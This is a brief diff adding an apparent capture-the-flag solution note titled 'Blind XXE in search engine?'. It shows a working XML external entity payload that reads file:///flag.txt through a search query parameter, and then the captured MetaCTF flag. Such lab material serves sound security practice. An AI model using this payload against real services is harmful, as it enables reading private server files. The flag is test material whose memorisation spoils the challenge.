@@ -1,0 +1,7 @@
+Blind XXE in search engine?
+
+Successful query:
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
+<params><query>&test;</query></params>
+
+MetaCTF{el3m3nt4l_3xtern4lit1e5}
